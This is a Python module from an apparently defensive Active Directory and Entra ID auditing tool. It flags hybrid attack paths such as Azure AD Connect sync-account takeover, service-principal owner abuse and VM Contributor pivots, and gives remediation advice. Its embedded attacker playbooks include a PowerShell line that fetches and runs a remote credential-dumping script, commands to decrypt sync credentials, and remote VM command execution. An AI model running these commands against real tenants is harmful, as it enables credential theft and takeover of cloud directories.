#!/usr/bin/env python3
"""
azure.py — Hybrid Active Directory & Azure (Entra ID) Analyzer.

Checks for:
1. Azure AD Connect Sync Server Takeover (on-premises computers/users related to sync)
2. AppRoleAssignment & Owner Abuse (Service Principals/Apps with high-priv Graph/Directory roles owned by users)
3. Azure VM Contributor Pivots (compromise of Azure VMs hosting critical services)
"""

from __future__ import annotations
from typing import Optional, List, Dict, Any

from ..models import ObjectStore, _as_str, _as_list
from ..theme import Severity
from .base import BaseAnalyzer, Finding

# High privilege Azure / Directory roles (Microsoft Entra ID)
HIGH_PRIV_AZURE_ROLES = {
    "Global Administrator",
    "Company Administrator",
    "User Administrator",
    "Privileged Role Administrator",
    "Application Administrator",
    "Cloud Application Administrator",
    "Hybrid Identity Administrator",
    "Directory Writers",
    "Partner Tier2 Support",
}

# High privilege MS Graph API AppRoles
HIGH_PRIV_GRAPH_ROLES = {
    "RoleManagement.ReadWrite.Directory",
    "AppRoleAssignment.ReadWrite.All",
    "Application.ReadWrite.All",
    "Directory.ReadWrite.All",
    "Group.ReadWrite.All",
}

class AzureHybridAnalyzer(BaseAnalyzer):
    name = "azure_hybrid"
    description = "Detect Azure AD Connect Sync takeover paths, AppRole/Owner abuse, and VM contributor pivots"

    def analyze(self, store: ObjectStore) -> Optional[Finding]:
        items: List[Dict[str, Any]] = []

        # 1. Azure AD Connect Sync Server Takeover
        # MSOL_ accounts are typically used by Azure AD Connect Sync.
        msol_users = [u for u in store.users.values() if u.name.upper().startswith("MSOL_")]
        # Computers likely running Azure AD Connect
        sync_computers = [
            c for c in store.computers.values()
            if "SYNC" in c.name.upper() or "ADCONNECT" in c.name.upper() or "AZUREADCONNECT" in c.name.upper()
        ]

        # Check who can control the MSOL_ sync accounts
        for msol in msol_users:
            for ace in msol.aces:
                if not isinstance(ace, dict):
                    continue
                right = _as_str(ace.get("RightName", ""))
                if right in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "ForceChangePassword"):
                    principal_sid = _as_str(ace.get("PrincipalSID", ""))
                    principal = store.resolve_sid(principal_sid)
                    if principal.sid:
                        items.append({
                            "type": "Azure AD Connect Sync Server Takeover",
                            "severity": Severity.CRITICAL,
                            "description": (
                                f"Compromised control over Azure AD Connect Sync account '{msol.name}' "
                                f"via '{right}' permission held by '{principal.name}'. "
                                "An attacker can reset the password or take over this account, "
                                "which typically holds sync privileges allowing them to write to on-premises AD and Azure AD."
                            ),
                            "target": msol.name,
                            "attacker": principal.name,
                            "right": right,
                            "playbook": (
                                f"# Decrypt AD Sync account credentials on the sync server using PowerShell cmdlets:\n"
                                f"Import-Module ADSync\n"
                                f"$client = new-object Microsoft.IdentityIntegration.Server.DirectoryConfigClient\n"
                                f"$client.GetConfiguration()\n"
                                f"# Alternatively, extract MSOL_ password directly using tools like adconnectdump"
                            )
                        })

        # Check who has admin rights on sync computers
        for comp in sync_computers:
            for ace in comp.aces:
                if not isinstance(ace, dict):
                    continue
                right = _as_str(ace.get("RightName", ""))
                if right in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "AllowedToAct"):
                    principal_sid = _as_str(ace.get("PrincipalSID", ""))
                    principal = store.resolve_sid(principal_sid)
                    if principal.sid:
                        items.append({
                            "type": "Azure AD Connect Sync Server Takeover",
                            "severity": Severity.HIGH,
                            "description": (
                                f"Weak permission '{right}' over Azure AD Connect server '{comp.name}' "
                                f"held by '{principal.name}'. Administrative control over this server allows "
                                "decrypting the Azure AD Sync service account password stored in the local SQL database."
                            ),
                            "target": comp.name,
                            "attacker": principal.name,
                            "right": right,
                            "playbook": (
                                f"# Dump AD Sync configuration from '{comp.name}' using adconnectdump.ps1:\n"
                                f"powershell -ep bypass -c \"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xpn/adconnectdump/master/adconnectdump.ps1'); AdConnectDump\""
                            )
                        })

        # 2. AppRoleAssignment & Owner Abuse
        # Walk through Azure entities
        for entity in store.azure.values():
            azure_type = entity.extras.get("azure_type", "ServicePrincipal")
            owners = _as_list(entity.extras.get("owners", []))
            
            # Check if this Service Principal / App has high privileged roles
            has_high_priv_role = False
            assigned_roles = []
            
            # Directory roles
            for r in _as_list(entity.extras.get("roles", [])):
                rname = ""
                if isinstance(r, dict):
                    rname = _as_str(r.get("Name", ""))
                elif isinstance(r, str):
                    rname = r
                if any(hpr in rname for hpr in HIGH_PRIV_AZURE_ROLES):
                    has_high_priv_role = True
                    assigned_roles.append(rname)

            # Graph API app roles
            for ar in _as_list(entity.extras.get("app_roles", [])):
                arname = ""
                if isinstance(ar, dict):
                    arname = _as_str(ar.get("RightName") or ar.get("Name", ""))
                elif isinstance(ar, str):
                    arname = ar
                if arname in HIGH_PRIV_GRAPH_ROLES:
                    has_high_priv_role = True
                    assigned_roles.append(arname)

            if has_high_priv_role and owners:
                for owner in owners:
                    owner_sid = ""
                    owner_name = ""
                    if isinstance(owner, dict):
                        owner_sid = _as_str(owner.get("ObjectIdentifier") or owner.get("PrincipalSID", ""))
                        owner_name = _as_str(owner.get("Name", owner_sid))
                    elif isinstance(owner, str):
                        owner_sid = owner
                        owner_name = store.resolve_sid(owner_sid).name

                    items.append({
                        "type": "Azure App/Owner Privilege Abuse",
                        "severity": Severity.HIGH,
                        "description": (
                            f"Azure {azure_type} '{entity.name}' has high-privilege role assignment(s): "
                            f"{', '.join(assigned_roles)}, and is owned by '{owner_name}'. "
                            "An attacker controlling the owner can abuse the Service Principal to perform "
                            "administrative actions in Microsoft Entra ID."
                        ),
                        "target": entity.name,
                        "attacker": owner_name,
                        "right": "Owner",
                        "playbook": (
                            f"# Request Azure AD access token for Service Principal '{entity.name}':\n"
                            f"az login --service-principal -u '{entity.extras.get('appid', '<APP_ID>')}' "
                            f"-p '<PASSWORD_OR_CERT_KEY>' --tenant '{entity.extras.get('tenantid', '<TENANT_ID>')}'"
                        )
                    })

        # 3. Azure VM Contributor Pivots
        for entity in store.azure.values():
            azure_type = entity.extras.get("azure_type", "")
            if azure_type.lower() in ("virtualmachine", "vm"):
                # Check for inbound control (e.g. contributor, write permissions)
                inbound_control = _as_list(entity.extras.get("inbound_control", []))
                for control in inbound_control:
                    if not isinstance(control, dict):
                        continue
                    right = _as_str(control.get("RightName", ""))
                    if right in ("Owner", "Contributor", "Virtual Machine Contributor", "Write"):
                        principal_sid = _as_str(control.get("PrincipalSID", ""))
                        principal = store.resolve_sid(principal_sid)
                        if principal.sid:
                            items.append({
                                "type": "Azure VM Contributor Pivot",
                                "severity": Severity.HIGH,
                                "description": (
                                    f"Azure VM '{entity.name}' can be compromised via '{right}' right "
                                    f"held by '{principal.name}'. This enables remote command execution on the VM "
                                    "which might host AD domain controllers or hybrid sync components."
                                ),
                                "target": entity.name,
                                "attacker": principal.name,
                                "right": right,
                                "playbook": (
                                    f"# Execute commands remotely on the Azure VM using az CLI:\n"
                                    f"az vm run-command invoke -g '<RESOURCE_GROUP>' -n '{entity.name}' "
                                    f"--command-id 'RunPowerShellScript' --scripts 'whoami; ipconfig'"
                                )
                            })

        if not items:
            return None

        # Sort by severity
        sev_order = {Severity.CRITICAL: 0, Severity.HIGH: 1, Severity.MEDIUM: 2, Severity.LOW: 3}
        items.sort(key=lambda x: sev_order.get(x["severity"], 3))

        overall_sev = Severity.HIGH
        if any(i["severity"] == Severity.CRITICAL for i in items):
            overall_sev = Severity.CRITICAL

        summary = f"Found {len(items)} hybrid AD/Azure privilege escalation path(s)."
        playbooks = [i["playbook"] for i in items if i.get("playbook")]

        return Finding(
            title="Hybrid AD & Azure (Entra ID) Paths",
            severity=overall_sev,
            summary=summary,
            data=items,
            recommendation=(
                "Secure the Azure AD Connect Sync servers: block access, restrict administrative privileges, "
                "and monitor MSOL_ sync account usage. Enforce strict Owner reviews for high-privileged "
                "Azure service principals and restrict Azure VM Contributor rights on critical workloads."
            ),
            eli5=(
                "Organizations often connect their on-premises Active Directory to Azure AD / Microsoft Entra ID "
                "using synchronization servers or virtual machines. If an attacker gains control over these "
                "hybrid components (like the AD Sync server, its sync user accounts, or Azure virtual machines), "
                "they can pivot from the on-premises network to full control of the cloud tenant, or vice-versa."
            ),
            remediation=(
                "1. Isolate Azure AD Connect servers as Tier-0 assets. Prevent non-admin access.\n"
                "2. Monitor password changes and logon events for MSOL_ accounts.\n"
                "3. Remove personal accounts from App/Service Principal Owners lists for high-value apps.\n"
                "4. Enforce Multi-Factor Authentication (MFA) and PIM for VM administrative roles."
            ),
            playbooks=playbooks[:5],
        )
